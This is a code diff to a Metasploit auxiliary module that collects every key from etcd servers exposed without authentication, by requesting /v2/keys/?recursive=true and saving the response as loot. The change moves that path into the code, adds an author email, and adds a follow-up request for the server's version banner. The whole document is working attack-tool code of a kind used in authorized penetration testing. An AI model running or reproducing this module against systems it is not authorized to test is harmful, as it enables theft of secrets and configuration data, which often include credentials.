@@ -19,7 +19,7 @@ class MetasploitModule < Msf::Auxiliary
           ['URL', 'https://elweb.co/the-security-footgun-in-etcd']
         ],
       'Author'      => [
-          'Giovanni Collazo', # discovery
+          'Giovanni Collazo <hello@gcollazo.com>', # discovery
           'h00die' # msf module
         ],
       'License'     => MSF_LICENSE
@@ -27,12 +27,12 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options([
       Opt::RPORT(2379),
-      OptString.new('TARGETURI', [ true,  'URI of the vulnerable service', '/v2/keys/?recursive=true'])
+      OptString.new('TARGETURI', [ true,  'URI of the vulnerable service', '/'])
     ])
   end
 
   def run_host(target_host)
-    path = normalize_uri(target_uri.to_s)
+    path = normalize_uri(target_uri.to_s, 'v2/keys/?recursive=true')
 
     vprint_status("#{peer} - Collecting data through #{path}...")
     res = send_request_raw({
@@ -40,16 +40,27 @@ class MetasploitModule < Msf::Auxiliary
       'method' => 'GET'
     })
 
-    # do a read the json if we got a good request back
+    # parse the json if we got a good request back
     if res and res.code == 200
       begin
         response = res.get_json_document
         store_loot('etcd.data', 'text/plain', rhost, response, 'etcd.keys', 'etcd keys')
+
+        # since we know its vulnerable, go ahead and pull the version information
+        res = send_request_raw({
+          'uri'    => normalize_uri(target_uri.to_s, 'version'),
+          'method' => 'GET'
+        })
+        banner = ''
+        if res and res.code == 200
+          banner = res.body
+        end
+
         report_service({
           :host => rhost,
           :port => rport,
           :name => 'etcd',
-          :info => "Unauthenticated access through #{ssl ? 'https' : 'http'}://#{peer}#{path}"
+          :info => banner
         })
       rescue JSON::ParserError => e
         print_error("Failed to read JSON: #{e.class} - #{e.message}}")
